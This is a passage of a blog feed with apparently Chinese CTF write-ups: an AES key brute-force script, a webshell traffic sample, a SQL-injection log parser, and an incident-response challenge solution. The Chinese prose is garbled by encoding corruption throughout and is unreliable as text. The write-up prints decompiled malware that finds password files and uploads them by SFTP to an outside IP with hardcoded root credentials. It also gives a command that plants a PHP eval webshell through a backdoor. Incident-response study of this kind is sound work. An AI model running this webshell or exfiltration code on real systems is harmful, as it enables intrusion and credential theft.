class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_aes_ecb</span>(<span class="params">ciphertext, key</span>):</span></span><br><span class="line">    cipher = AES.new(key.encode(), AES.MODE_ECB)</span><br><span class="line">    decrypted_bytes = cipher.decrypt(base64.b64decode(ciphertext))</span><br><span class="line">    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_from_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_key_from_file</span>(<span class="params">key_path</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(key_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">        keys = key_file.read().splitlines()</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># ä»æ–‡ä»¶ä¸­è¯»å–å¯†æ–‡å’Œå¯†é’¥</span></span><br><span class="line">    ciphertext_path = <span class="string">&quot;D:\\vscodework\\ctf\\5space\\cip.txt&quot;</span>  <span class="comment"># æ›¿æ¢ä¸ºå®é™…çš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    key_path = <span class="string">&quot;D:\\vscodework\\ctf\\5space\\pass.txt&quot;</span>  <span class="comment"># æ›¿æ¢ä¸ºå®é™…çš„å¯†é’¥æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ciphertext = read_from_file(ciphertext_path)</span><br><span class="line">    <span class="comment">#print(ciphertext)</span></span><br><span class="line">    ciphertext = read_from_file(ciphertext_path)</span><br><span class="line">    keys = read_key_from_file(key_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># keys = read_key_from_file(key_path)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    decryption_success = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">#å°è¯•æ¯ä¸ªå¯†é’¥è¿›è¡Œè§£å¯†</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            mima = key.strip()</span><br><span class="line">            key = hashlib.md5(mima.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">            key = key[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">            decrypted_text = decrypt_aes_ecb(ciphertext, key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Decrypted Text with Key <span class="subst">&#123;key&#125;</span>:<span class="subst">&#123;mima&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(decrypted_text)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> decrypted_text:</span><br><span class="line">                decryption_success = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Decryption successful. Stopping further attempts.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># è§£å¯†æˆåŠŸå¹¶åŒ…å«&quot;success&quot;ï¼Œåœæ­¢å°è¯•å…¶ä»–å¯†é’¥</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Decryption with Key <span class="subst">&#123;key&#125;</span> failed: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> decryption_success:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decryption unsuccessful with all keys.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># wireshark</span></span><br><span class="line"><span class="comment">#$mode=&quot;ZG93bmxvYWRQYXJ0&quot;;$mode=base64_decode($mode);$path=&quot;QzovVXNlcnMvQWRtaW5pc3RyYXRvci9EZXNrdG9wL3Byb2plY3RzL3Byb2plY3Quemlw&quot;;$path=base64_decode($path);$hash=&quot;&quot;;$blockIndex=&quot;MA==&quot;;$blockIndex=base64_decode($blockIndex);$blockSize=&quot;MTA0ODU3Ng==&quot;;$blockSize=base64_decode($blockSize);$content=&quot;&quot;;$charset=&quot;&quot;;$newpath=&quot;&quot;;$createTimeStamp=&quot;&quot;;$accessTimeStamp=&quot;&quot;;$modifyTimeStamp=&quot;&quot;;</span></span><br><span class="line"><span class="comment">#main($mode,$path,$hash,$blockIndex,$blockSize,$content,$charset,$newpath,$createTimeStamp,$accessTimeStamp,$modifyTimeStamp);&#x27;</span></span><br></pre></td></tr></table></figure><p>è§£æ–‡ä»¶å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_json</span>(<span class="params">input_json</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è§£æ JSON è¾“å…¥</span></span><br><span class="line">        json_data = json.loads(input_json)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¯¹æ¯ä¸ªå¯¹è±¡çš„å€¼è¿›è¡Œ Base64 è§£ç </span></span><br><span class="line">        decoded_json = []</span><br><span class="line">        <span class="keyword">for</span> obj <span class="keyword">in</span> json_data:</span><br><span class="line">            decoded_obj = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> obj.items():</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">str</span>):</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        decoded_value = base64.b64decode(value).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        decoded_obj[key] = decoded_value</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="comment"># å¦‚æœè§£ç å¤±è´¥ï¼Œåˆ™ä¿ç•™åŸå§‹å€¼</span></span><br><span class="line">                        decoded_obj[key] = value</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    decoded_obj[key] = value</span><br><span class="line">            decoded_json.append(decoded_obj)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> decoded_json</span><br><span class="line">    <span class="keyword">except</span> json.JSONDecodeError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> [&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid JSON format&quot;</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># æç¤ºç”¨æˆ·è¾“å…¥ JSON æ•°ç»„å­—ç¬¦ä¸²</span></span><br><span class="line">    input_json = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥JSONæ•°ç»„å­—ç¬¦ä¸²ï¼š&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è°ƒç”¨å‡½æ•°è¿›è¡Œè§£ç å¹¶æ‰“å°ç»“æœ</span></span><br><span class="line">    decoded_json = decode_base64_json(input_json)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è§£ç åçš„JSONå†…å®¹ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(json.dumps(decoded_json, indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure><h5 id="sql-log"><a href="#sql-log" class="headerlink" title="sql log"></a>sql log</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\week2\\access.log&quot;</span>,encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">f = f.readlines()</span><br><span class="line">lists = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    s = re.findall(<span class="string">&quot;1\)\)=(.*),sl&quot;</span>,i)</span><br><span class="line">    num = re.findall(<span class="string">&quot;0user\),(.*?),1\)&quot;</span>,i)</span><br><span class="line">    <span class="comment"># lists[num[0]] = s[0]</span></span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    lists[<span class="built_in">int</span>(num[<span class="number">0</span>])]= <span class="built_in">str</span>(s[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">list</span>(lists.values()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(e)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸€å±Šå¸•é²æ¯-CTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp</title>
      <link href="/2024/04/19/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/04/19/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085916686.png" alt="image-20240423085916686"></p><p>èµ›é¢˜ï¼š<a href="https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y">https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y</a></p><p>èµ›é¢˜æ–‡ä»¶ï¼š<a href="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E%E6%89%8B%E5%86%8C.pdf">åº”æ€¥å“åº”æ¨¡å—è¯´æ˜æ‰‹å†Œ.pdf </a>åº”æ€¥å“åº”æ¨¡å—è¯´æ˜æ‰‹å†Œ.pdf </p><h2 id="åº”æ€¥å“åº”-1"><a href="#åº”æ€¥å“åº”-1" class="headerlink" title="åº”æ€¥å“åº”-1"></a>åº”æ€¥å“åº”-1</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æ‰¾åˆ°JumpServerå ¡å’æœºä¸­flagæ ‡ç­¾çš„å€¼ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[å ¡å’æœºä¸­flagæ ‡ç­¾çš„å€¼]</p><p>ç™»ä¸Šjumpserverå°±å¯ä»¥äº†<br>ç‚¹æ§åˆ¶å°çš„æ›´å¤šé€‰é¡¹é‡Œé¢æœ‰ä¸ªæ ‡ç­¾å€¼å³å¯</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240419135123741.png" alt="image-20240419135123741"></p><h2 id="åº”æ€¥å“åº”-2"><a href="#åº”æ€¥å“åº”-2" class="headerlink" title="åº”æ€¥å“åº”-2"></a>åº”æ€¥å“åº”-2</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…ç¬¬ä¸€æ¬¡ç™»å½•æ—¶é—´ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[2024/00/00/00:00:00]<br>æ‰¾åˆ°æ—¥å¿—å®¡è®¡ï¼ŒæŸ¥çœ‹ç™»å½•æ—¥å¿—ï¼Œé€‰ä¸€ä¸‹æ—¶é—´ï¼Œè¿‘ä¸€å¹´çš„ï¼Œ</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422091737237.png" alt="image-20240422091737237"></p><p>ipä¸º192.168.20.123çš„æ—¶é—´</p><blockquote><p>flag : [2024/04/11/14:21:18]</p></blockquote><h2 id="åº”æ€¥å“åº”-3"><a href="#åº”æ€¥å“åº”-3" class="headerlink" title="åº”æ€¥å“åº”-3"></a>åº”æ€¥å“åº”-3</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…æºIPã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[0.0.0.0]</p><p>å› ä¸ºåé¢test01çš„ç”¨æˆ·æ‰§è¡Œäº†jump serverçš„rceï¼Œå¯èƒ½æ˜¯natè½¬è¿‡æ¥çš„</p><blockquote><p>flag:192.168.1.4</p></blockquote><h2 id="åº”æ€¥å“åº”-4"><a href="#åº”æ€¥å“åº”-4" class="headerlink" title="åº”æ€¥å“åº”-4"></a>åº”æ€¥å“åº”-4</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»è€…ä½¿ç”¨çš„cveç¼–å·ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[CVE-0000-0000]</p><p>åœ¨å®¡è®¡å°çš„æ—¥å¿—å®¡è®¡ä¸­ï¼Œæœ‰ä¸€ä¸ªä½œä¸šæ—¥å¿—</p><p>testæ‰§è¡Œäº†ä¸¤ä¸ªrce</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422092914024.png" alt="image-20240422092914024"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422093117730.png" alt="image-20240422093117730"></p><p>æœ‰ä¸¤ä¸ªï¼Œéƒ½è¯•ä¸€ä¸‹</p><blockquote><p>flag: CVE-2024-29201</p></blockquote><h2 id="åº”æ€¥å“åº”-5"><a href="#åº”æ€¥å“åº”-5" class="headerlink" title="åº”æ€¥å“åº”-5"></a>åº”æ€¥å“åº”-5</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…ç•™åœ¨WebæœåŠ¡å™¨ä¸Šçš„æ¶æ„ç¨‹åºçš„32ä½å°å†™md5å€¼ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxxxx]</p><p>ç”±é¢˜æ„å¯çŸ¥ï¼ŒwebæœåŠ¡å™¨åœ¨ 192.168.20.121ä¸Šé¢ï¼Œä½†æ˜¯ 192.168.20.121çš„æœåŠ¡å™¨è´¦å·å¯†ç æ˜¯æ²¡æœ‰ç»™çš„æˆ‘ä»¬å¯ä»¥åœ¨jumpä¸Šé¢çœ‹ä¸€ä¸‹å†å²å‘½ä»¤ï¼Œåœ¨èµ„äº§åˆ—è¡¨é‡Œé¢ç™»å½•ï¼Œçœ‹å†å²å‘½ä»¤ï¼Œæœä¸€ä¸‹passwd shadowç­‰ç­‰</p><p>ç¬¬ä¸€æ¡å¯ä»¥çœ‹åˆ°palu.comçš„hashç­‰ç­‰<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422095000280.png" alt="image-20240422095000280"></p><p>ä½†æ˜¯è¿™ä¸ªpalu.comçš„hashä¸å…¨ï¼Œè£‚å¼€<br>æˆ‘ä»¬è¿™é‡Œå…¶å®å¯ä»¥ç›´æ¥ç”¨diskgeninuså°†serverçš„ç›˜å¯¼è¿›æ¥ï¼Œç›´æ¥çœ‹æ–‡ä»¶<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422113122397.png" alt="image-20240422113122397"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422113314688.png" alt="image-20240422113314688"></p><p>ç›´æ¥è·‘hash,palu.com/123123<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422134343810.png" alt="image-20240422134343810"></p><p>webserverä¸Šæœ‰è®¡ç®—è¿‡homeæ–‡ä»¶</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422134415059.png" alt="image-20240422134415059"></p><p>åœ¨rootä¸‹é¢ä¹Ÿå¯ä»¥æ‰¾åˆ°homeæ–‡ä»¶ï¼Œè®¡ç®—ä¸€ä¸‹å³å¯</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422135155298.png" alt="image-20240422135155298"></p><p>è¿™é‡ŒçŸ¥é“è´¦å·å¯†ç ç›´æ¥sshè¿ä¸Šæ¥ï¼Œåœ¨222ç«¯å£</p><blockquote><p>flag:84413332e4e7138adc5d6f1f688ddd69</p></blockquote><h2 id="åº”æ€¥å“åº”-6"><a href="#åº”æ€¥å“åº”-6" class="headerlink" title="åº”æ€¥å“åº”-6"></a>åº”æ€¥å“åº”-6</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>åˆ†ææ¶æ„ç¨‹åºè¿æ¥åœ°å€å’Œå¯†ç ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(åœ°å€)-md5(å¯†ç )] md5å€¼ä¸ºå…¨å°å†™32ä½é•¿åº¦</p><p>æŠ„äººå®¶çš„wpå‘ç°æ˜¯ä¸€ä¸ªpythonçš„linuxæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: palucomeyi1.pyc (Python 3.10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_in_files</span>(<span class="params">directory, search_text</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span></span><br><span class="line">    hostname = <span class="string">&#x27;82.157.238.111&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;1qaz@WSX3edc&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>82.157.238.111 1qaz@WSX3edc</p></blockquote><h2 id="åº”æ€¥å“åº”-7"><a href="#åº”æ€¥å“åº”-7" class="headerlink" title="åº”æ€¥å“åº”-7"></a>åº”æ€¥å“åº”-7</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç«¯å£ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(ç«¯å£)]</p><p>ç™»å½•é›·æ± çš„wafå¯ä»¥çœ‹åˆ°fastjsonçš„ç«¯å£</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422100949500.png" alt="image-20240422100949500"></p><p>ä¸Šæ¸¸åœ°å€æ˜¯8080ï¼Œæ˜ å°„åˆ°é›·æ± çš„7878ï¼Œæ‰€ä»¥æœ¬èº«æ˜¯8080ç«¯å£</p><blockquote><p>flag:8080çš„md5</p></blockquote><h2 id="åº”æ€¥å“åº”-8"><a href="#åº”æ€¥å“åº”-8" class="headerlink" title="åº”æ€¥å“åº”-8"></a>åº”æ€¥å“åº”-8</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…ä½¿ç”¨çš„åé—¨è·¯ç”±åœ°å€ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(/api/xxx)]<br>æˆ‘ä»¬åœ¨jumpä¸Šç¿»ä¸€ç¿»ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªlog.txtï¼Œä¹Ÿæ˜¯ä¸å…¨çš„ï¼Œå½“æ—¶åšé¢˜çš„æ—¶å€™ï¼Œæ²¡æœ‰webserverçš„å¯†ç ï¼Œé‚£ä¹ˆå°±çœ‹ä¸äº†<br>ç¿»é‚£ä¸ªwafçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å‘½ä»¤æ‰§è¡Œçš„åé—¨ï¼Œç„¶åç´¢æ€§ï¼ŒæŠŠé›·æ± wafæ‰€æœ‰çš„å®‰å…¨éƒ½å…³æ‰ï¼Œç›´æ¥å†™ä¸ªé©¬è¿›å»ï¼Œè¿ä¸Šï¼Œç›´æ¥ç¿»logçš„txtå°±å¯ä»¥äº†ã€‚å½“ç„¶ï¼Œè¿™æ ·è‚¯å®šä¸æ˜¯é¢„æœŸè§£ã€‚<br><code>?123=system(&quot;echo &#39;&lt;?php eval(\$_POST[1]); ?&gt;&#39; &gt; a.php&quot;);</code><br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422101901120.png" alt="image-20240422101901120"></p><p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶åä¸ºflaskï¼Œé‚£ä¹ˆå¯èƒ½å°±æ˜¯pyæ–‡ä»¶äº†<br>å…¨ç›˜æœï¼Œæ²¡æœ‰æœåˆ°ï¼Œåº”è¯¥æ˜¯åˆ äº†<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422102029282.png" alt="image-20240422102029282"></p><p>å›åˆ°jumpé‡Œé¢æœå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°æœ‰æ¥å£system</p><blockquote><p>flag:/api/systemçš„md5</p></blockquote><h2 id="åº”æ€¥å“åº”-9"><a href="#åº”æ€¥å“åº”-9" class="headerlink" title="åº”æ€¥å“åº”-9"></a>åº”æ€¥å“åº”-9</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤dnslogåå¼¹åŸŸåã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(åŸŸå)]</p><p>logæ—¥å¿—ä¸­æœ‰</p><blockquote><p>flag:0vqkht.dnslog.cn</p></blockquote><h2 id="åº”æ€¥å“åº”-10"><a href="#åº”æ€¥å“åº”-10" class="headerlink" 